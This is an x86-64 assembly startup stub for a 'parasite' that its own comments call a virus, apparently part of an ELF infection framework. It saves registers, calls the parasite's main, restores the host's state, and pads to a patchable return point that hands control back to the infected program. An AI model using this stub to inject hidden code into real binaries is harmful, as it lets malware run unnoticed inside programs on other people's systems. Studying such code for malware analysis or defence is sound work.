/*
When the parasite finishes execution, we need to restore the original stack
frame as if nothing happened before. In order to support all redirection method
the startup script is engineered in a way that maybe saves more registers than
necessary. The original libc entry point is here:

https://github.com/bminor/glibc/blob/master/sysdeps/x86_64/start.S

We could support support forwarding arc/arg/envp to virus but due to lack of
use case, and complexity to make it work cross platform (x86-64 redirection
is more complicated), we don't do it. Which makes this script way smaller
and generic for all redirection methods. If users do want to forward them,
it must be done with great care.
*/

/* use a custom linker script to make sure this is the first in text. */
.section .text.start_parasite
.global _start
_start:

push %rax
push %rbx
push %rcx
push %rdx
push %rbp
push %rsi
push %rdi
push %r8
push %r9
push %rsp

call main

pop %rsp
pop %r9
pop %r8
pop %rdi
pop %rsi
pop %rbp
pop %rdx
pop %rcx
pop %rbx
pop %rax

/* pad here so the _patch_return offset is the same on both x86_64 and aarch64*/
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

/* offset from _start is 64 */
.global _patch_return
_patch_return:
nop                      /* zero the stack frame */
nop
nop
nop
nop
nop
nop
hlt